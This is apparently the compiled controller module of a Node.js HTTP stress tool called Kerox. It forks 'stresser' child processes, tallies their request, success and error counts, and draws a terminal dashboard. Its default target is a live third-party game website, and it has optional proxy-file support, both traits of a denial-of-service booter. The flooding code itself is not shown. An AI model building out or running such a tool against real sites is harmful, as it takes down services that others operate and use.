"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.Kerox = void 0;
const child_process_1 = require("child_process");
const Utils_1 = require("../utils/Utils");
const Counter_1 = require("./Counter");
require("overpaint.js");
const path_1 = __importDefault(require("path"));
class Kerox {
    static header = (0, Utils_1.getStatic)('header.txt')._RebeccaPurple;
    logs = [];
    stressers = new Map();
    stresserStats = new Map();
    options = {
        target: 'https://starve.io',
        useProxies: false,
        proxyFile: 'proxies.txt'
    };
    stats = {
        startTime: Date.now(),
        requests: new Counter_1.Counter(),
        pending: new Counter_1.Counter(),
        success: new Counter_1.Counter(),
        errors: new Counter_1.Counter(),
    };
    get duration() {
        return (0, Utils_1.toHumanTime)(Date.now() - this.stats.startTime, true);
    }
    constructor(options) {
        // set options
        if (typeof options === 'object') {
            Object.assign(this.options, options);
        }
        // add static logs
        // this.logs.push(`   Target: ${this.options.target}`._PurpleAmethyst);
        // spawn stressers
        this.spawnStressers(1);
        // start rendering terminal
        this.renderTerminal(2);
    }
    // ========== Stats ================================================================================
    updateStats() {
        // reset stats
        this.stats.requests.reset();
        this.stats.pending.reset();
        this.stats.success.reset();
        this.stats.errors.reset();
        // cumulate stresser stats
        this.stresserStats.forEach(stats => {
            this.stats.requests.inc(stats.requests);
            this.stats.pending.inc(stats.pending);
            this.stats.success.inc(stats.success);
            this.stats.errors.inc(stats.errors);
        });
    }
    // ========== Rendering ============================================================================
    renderFrame() {
        console.clear();
        console.log(Kerox.header, '\n');
        console.log(`
   ${("Target:    " + this.options.target)._PurpleAmethyst}

   ${("Duration:  " + this.duration)._Gray}
   ${("Requests:  " + this.stats.requests.count)._White}
   ${("Pending:   " + this.stats.pending.count)._OrangeGold}
   ${("Success:   " + this.stats.success.count)._GreenApple}
   ${("Errors:    " + this.stats.errors.count)._Red}
      `);
        this.logs.forEach(log => console.log(log));
    }
    renderTerminal(fps = 10) {
        this.renderFrame();
        setInterval(() => this.renderFrame(), 1000 / fps);
    }
    // ========== Stressers =============================================================================
    spawnStressers(amount) {
        for (let i = 0; i < amount; i++) {
            const stresser = (0, child_process_1.fork)(path_1.default.join(__dirname, '..', 'exec', 'Spawn.js'));
            this.stressers.set(stresser.pid, stresser);
            stresser.on('message', (message) => {
                if (typeof message !== 'object')
                    return;
                switch (message.type) {
                    case 'spawned':
                        this.logs.push(`   Spawned stresser (pid: ${message.pid})`._BlueDiamond);
                        break;
                    case 'data':
                        this.stresserStats.set(stresser.pid, message.data);
                        this.updateStats();
                        // console.log(message.data);
                        break;
                }
            });
            stresser.on('error', (err) => {
                console.error(`Error: ${err.message}`);
            });
            stresser.send({
                type: 'spawn',
                options: {
                    ...this.options,
                    background: true,
                    debugMode: true
                }
            });
        }
    }
}
exports.Kerox = Kerox;
//# sourceMappingURL=Kerox.js.map